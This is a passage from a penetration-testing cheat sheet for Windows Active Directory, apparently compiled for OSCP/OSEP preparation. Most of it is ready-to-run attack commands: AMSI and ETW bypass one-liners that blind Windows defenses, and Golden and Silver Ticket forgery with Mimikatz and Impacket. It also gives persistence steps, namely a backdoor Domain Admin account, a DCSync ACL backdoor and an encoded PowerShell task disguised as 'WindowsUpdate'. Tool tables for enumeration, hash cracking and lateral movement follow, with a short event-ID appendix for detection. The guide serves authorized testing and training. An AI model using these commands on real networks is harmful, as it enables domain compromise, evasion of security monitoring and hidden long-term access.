| BloodHound collection | LDAP queries / SMB enumeration | Use `--stealth` or `DCOnly` collection |

### AMSI Bypass (in memory)
```powershell
# Simple AMSI bypass (PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Via Evil-WinRM
Bypass-4MSI
```

### ETW (Event Tracing for Windows) Bypass
```powershell
# Patch ETW in current process
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

---

## 21. Persistence Techniques

### Golden Ticket
```powershell
# Requirements: krbtgt hash + Domain SID
# Get domain SID
Get-ADDomain | select DomainSID

# Generate Golden Ticket (Mimikatz)
kerberos::golden /user:fakeadmin /domain:VULN.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:KRBTGT_HASH /ptt

# Impacket version
python ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXXXXX -domain VULN.local fakeadmin
export KRB5CCNAME=fakeadmin.ccache
python psexec.py VULN.local/fakeadmin@DC_IP -k -no-pass
```

### Silver Ticket
```powershell
# More stealthy — no DC interaction needed
kerberos::golden /user:admin /domain:VULN.local /sid:S-1-5-21-... /target:dc01.VULN.local /service:cifs /rc4:SERVICE_HASH /ptt

# Available services: cifs, host, http, mssqlsvc, ldap
```

### Account Creation (Backdoor)
```powershell
net user backdoor P@ssw0rd123 /add /domain
net group "Domain Admins" backdoor /add /domain
```

### ACL Backdoor (stealthy)
```powershell
# Grant DCSync rights to a low-priv user (Mimikatz)
# or via PowerView
Add-ObjectACL -PrincipalIdentity dritchie -Rights DCSync
```

### Scheduled Task Persistence
```powershell
schtasks /create /s target-pc /u VULN\admin /p Password123 /tn "WindowsUpdate" /tr "powershell -enc BASE64" /sc daily /st 09:00

schtasks /run /s target-pc /tn "WindowsUpdate"
```

---

## 22. Quick Reference — Tool Comparison Table

### Scanning & Enumeration
| Task | Tool | Command |
|------|------|---------|
| SMB hosts | nxc | `nxc smb 10.10.10.0/24` |
| LDAP dump | ldapdomaindump | `ldapdomaindump -u 'VULN\user' -p pass DC_IP` |
| BloodHound collect (Linux) | bloodhound-python | `bloodhound-python -u user -p pass -d domain -ns DC_IP -c All` |
| BloodHound collect (Windows) | SharpHound | `SharpHound.exe -c All` |
| SPN enum | GetUserSPNs | `impacket-GetUserSPNs -dc-ip DC_IP DOMAIN/user:pass` |
| User enum | kerbrute | `kerbrute userenum -d domain --dc DC_IP users.txt` |

### Exploitation
| Attack | Tool | Hash Mode |
|--------|------|-----------|
| Kerberoast | hashcat | `-m 13100` |
| AS-REP Roast | hashcat | `-m 18200` |
| Net-NTLMv2 | hashcat | `-m 5600` |
| Net-NTLMv1 | hashcat | `-m 5500` |
| NTLM (pass) | — | Pass directly |

### Lateral Movement Summary
| Tool | Auth | Port | Shell Type |
|------|------|------|-----------|
| evil-winrm | Pass/Hash | 5985 | PowerShell |
| impacket-psexec | Pass/Hash | 445 | cmd.exe |
| impacket-smbexec | Pass/Hash | 445 | cmd.exe (semi) |
| impacket-wmiexec | Pass/Hash | 135 | cmd.exe |
| impacket-dcomexec | Pass/Hash | 135 | cmd.exe |
| xfreerdp | Pass/Hash | 3389 | GUI |

### RDP Connection
```bash
xfreerdp /u:Administrator /p:'P@ssw0rd!' /v:10.10.10.100:3389 /w:1920 /h:1080 /fonts /smart-sizing +clipboard
```

---

## Appendix: Common Event IDs for Detection Awareness

| Event ID | Description | Triggered by |
|----------|-------------|-------------|
| 4624 | Logon success | All authentications |
| 4625 | Logon failure | Bad password, password spray |
| 4648 | Explicit credentials logon | runas, Pass-the-Hash |
| 4662 | Object operation | DCSync |
| 4663 | Object access | File/folder access |
| 4672 | Special privileges assigned | Admin logon |
| 4688 | Process created | Lateral movement |
| 4698 | Scheduled task created | Persistence |
| 4720 | User account created | Backdoor account |
| 4732 | Member added to group | Privilege escalation |
| 4768 | TGT requested | Kerberos auth / AS-REP Roast |
| 4769 | TGS requested | Kerberoasting |
| 4771 | Kerberos pre-auth failed | Password spray (Kerberos) |
| 7045 | Service installed | PsExec, persistence |

---

_Guide compiled from lab notes + OSCP/OSEP prep - for authorized security testing only._
_Researched and Developed by **Abbas d3hack Aghayev**. Refined by "Sonnet4.6"_